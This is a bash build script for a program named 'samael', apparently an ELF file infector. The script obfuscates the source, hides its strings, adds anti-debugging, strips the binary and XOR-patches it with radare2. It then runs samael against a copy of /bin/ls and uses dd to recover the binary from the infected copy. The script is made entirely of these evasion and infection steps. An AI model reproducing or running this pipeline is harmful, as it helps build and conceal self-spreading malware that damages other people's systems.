#!/bin/bash

if [[ "$1" == "clean" ]];
then
    rm -f samael test
    exit 0
fi

../tools/obfuscator/obfuscator.sh samael.c
../tools/obfuscator/obfuscator.sh samael.h
../tools/hide-strings/hide-strings.sh samael.c
../tools/hide-strings/hide-strings.sh samael.h
gcc -Wl,--no-as-needed -ldl samael.c -o samael
../tools/anti-debug/anti-debug.sh
./build.sh clean
gcc -Wl,--no-as-needed -ldl samael.c -o samael
strip --strip-all samael
r2 -2qc 'wox 0x03@0x5!1; q!!!' -w samael
mv samael.c.bak samael.c
mv samael.h.bak samael.h
cp /bin/ls ./test
samael_size=$(stat samael | grep Size: | cut -c -19 | cut -c 9-)
./samael
if [[ $(ls | grep -E "samael" | head -n 1) != 'samael' ]]
then
    dd if=./test of=./samael bs=1 count=$samael_size 2> /dev/null
    chmod +x samael
    cp /bin/ls ./test
else
    ./build.sh
fi
